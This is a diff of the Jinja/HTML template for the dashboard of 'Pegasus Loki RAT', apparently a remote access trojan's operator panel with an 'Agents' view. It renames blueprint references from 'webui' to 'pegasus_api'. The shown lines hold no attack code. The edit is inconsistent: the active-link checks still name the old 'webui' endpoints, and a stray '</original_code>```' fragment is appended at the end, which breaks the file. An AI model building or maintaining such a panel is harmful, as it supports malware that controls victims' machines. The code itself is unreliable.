@@ -9,7 +9,7 @@
   <title>{% if title %}{{ title }} - {% endif %}Pegasus Loki RAT</title>
 
   <!-- Favicon -->
-  <link rel="icon" type="image/x-icon" href="{{ url_for('webui.static', filename='icon.ico') }}">
+  <link rel="icon" type="image/x-icon" href="{{ url_for('pegasus_api.static', filename='icon.ico') }}">
 
   <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -18,8 +18,8 @@
     rel="stylesheet">
 
   <!-- CSS Files -->
-  <link rel="stylesheet" href="{{ url_for('webui.static', filename='css/pegasus-premium.css') }}">
-  <link rel="stylesheet" href="{{ url_for('webui.static', filename='css/modern-style.css') }}">
+  <link rel="stylesheet" href="{{ url_for('pegasus_api.static', filename='css/pegasus-premium.css') }}">
+  <link rel="stylesheet" href="{{ url_for('pegasus_api.static', filename='css/modern-style.css') }}">
 
   <!-- Meta Tags for Security -->
   <meta http-equiv="X-Content-Type-Options" content="nosniff">
@@ -51,7 +51,7 @@
       <div class="header-content">
         <!-- Logo Section -->
         <div class="logo-section">
-          <a href="{{ url_for('webui.index') }}" class="logo-link">
+          <a href="{{ url_for('pegasus_api.index') }}" class="logo-link">
             <span class="logo-icon">⚡</span>
             <div class="logo-text">
               <h1>PEGASUS</h1>
@@ -64,14 +64,14 @@
         <nav class="main-nav">
           <ul class="nav-menu">
             <li class="nav-item">
-              <a href="{{ url_for('webui.index') }}"
+              <a href="{{ url_for('pegasus_api.index') }}"
                 class="nav-link {% if request.endpoint == 'webui.index' %}active{% endif %}">
                 <span class="nav-icon">🏠</span>
                 <span class="nav-text">Dashboard</span>
               </a>
             </li>
             <li class="nav-item">
-              <a href="{{ url_for('webui.agent_list') }}"
+              <a href="{{ url_for('pegasus_api.agents') }}"
                 class="nav-link {% if request.endpoint == 'webui.agent_list' %}active{% endif %}">
                 <span class="nav-icon">🤖</span>
                 <span class="nav-text">Agents</span>
@@ -760,3 +760,4 @@
       // Update agent count on page load
       document.addEventListener('DOMContentLoaded', updateAgentCount);
     </script>
+</original_code>```
